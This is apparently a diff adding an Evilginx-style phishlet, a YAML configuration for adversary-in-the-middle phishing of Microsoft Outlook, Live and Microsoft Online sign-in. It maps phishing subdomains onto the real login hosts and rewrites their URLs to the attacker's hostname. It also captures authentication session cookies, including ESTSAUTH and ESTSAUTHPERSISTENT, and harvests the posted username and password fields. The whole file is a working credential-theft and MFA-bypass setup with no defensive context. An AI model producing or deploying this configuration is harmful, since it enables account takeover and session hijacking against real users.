@@ -1,0 +1,225 @@
+min_ver: "2.3.0"
+proxy_hosts:
+  - {
+      phish_sub: "outlook",
+      orig_sub: "outlook",
+      domain: "live.com",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "live",
+      orig_sub: "login",
+      domain: "live.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "account",
+      orig_sub: "account",
+      domain: "live.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "office365",
+      orig_sub: "outlook",
+      domain: "office365.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "autologon",
+      orig_sub: "autologon",
+      domain: "microsoftazuread-sso.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "mcasproxy",
+      orig_sub: "mcasproxy",
+      domain: "azureedge.net",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "outlook-us",
+      orig_sub: "outlook",
+      domain: "office365.com.us3.cas.ms",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "outlook-1",
+      orig_sub: "outlook-1",
+      domain: "cdn.office.net.us3.cas.ms",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "login-us",
+      orig_sub: "login",
+      domain: "office365.com.us3.cas.ms",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "browser",
+      orig_sub: "browser.pipe.aria",
+      domain: "microsoft.com.us3.cas.ms",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "bitcdemo-com",
+      orig_sub: "bitcdemo-com",
+      domain: "prod05.access-control.cas.ms",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "aadcdn",
+      orig_sub: "",
+      domain: "aadcdn.msftauth.net",
+      session: true,
+      is_landing: false,
+    }
+
+sub_filters:
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "https://login.live.com",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "https://login.live.com/ppsecure/",
+      replace: "https://{hostname}/ppsecure/",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "https://login.live.com/GetCredentialType.srf",
+      replace: "https://{hostname}/GetCredentialType.srf",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "https://login.live.com/GetSessionState.srf",
+      replace: "https://{hostname}/GetSessionState.srf",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "outlook",
+      domain: "live.com",
+      search: "https://outlook.live.com",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+      redirect_only: true,
+    }
+  - {
+      triggers_on: "login.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: "https://login.microsoftonline.com",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "outlook.live.com",
+      orig_sub: "outlook",
+      domain: "live.com",
+      search: "https://outlook.live.com",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "aadcdn.msftauth.net",
+      orig_sub: "",
+      domain: "aadcdn.msftauth.net",
+      search: "https://aadcdn.msftauth.net",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+auth_tokens:
+  - domain: ".login.microsoftonline.com"
+    keys:
+      [
+        "esctx",
+        "ESTSAUTHPERSISTENT",
+        "ESTSAUTH",
+        "ch",
+        "CCState",
+        "CcsSharedSignInState",
+        "SignInStateCookie",
+        ".*,regexp",
+      ]
+  - domain: "login.microsoftonline.com"
+    keys: ["ESTSAUTHLIGHT", "x-ms-gateway-slice", ".*,regexp"]
+  - domain: "outlook.office365.com"
+    keys:
+      [
+        "DefaultAnchorMailbox",
+        "UC",
+        "OutlookSession",
+        "X-OWA-CANARY",
+        ".*,regexp",
+      ]
+  - domain: ".login.live.com"
+    keys:
+      [
+        "MSCC",
+        "MSPPre",
+        "MSPCID",
+        "MSPOK",
+        "JSHP",
+        "JSH",
+        "SDIDC",
+        "MSPBack",
+        "uaid",
+        "MSPRequ",
+        "MSPSoftVis",
+        "OParams",
+        ".*,regexp",
+      ]
+
+auth_urls:
+  - "/GetCredentialType.srf"
+  - "/GetSessionState.srf"
+  - "/login.srf"
+  - "/ppsecure/post.srf"
+  - "/oauth20_authorize.srf"
+  - "/authorize"
+  - "/mail/"
+  - "/0/"
+
+credentials:
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "passwd"
+    search: "(.*)"
+    type: "post"
+login:
+  domain: "outlook.live.com"
+  path: "/owa/?nlp=1"
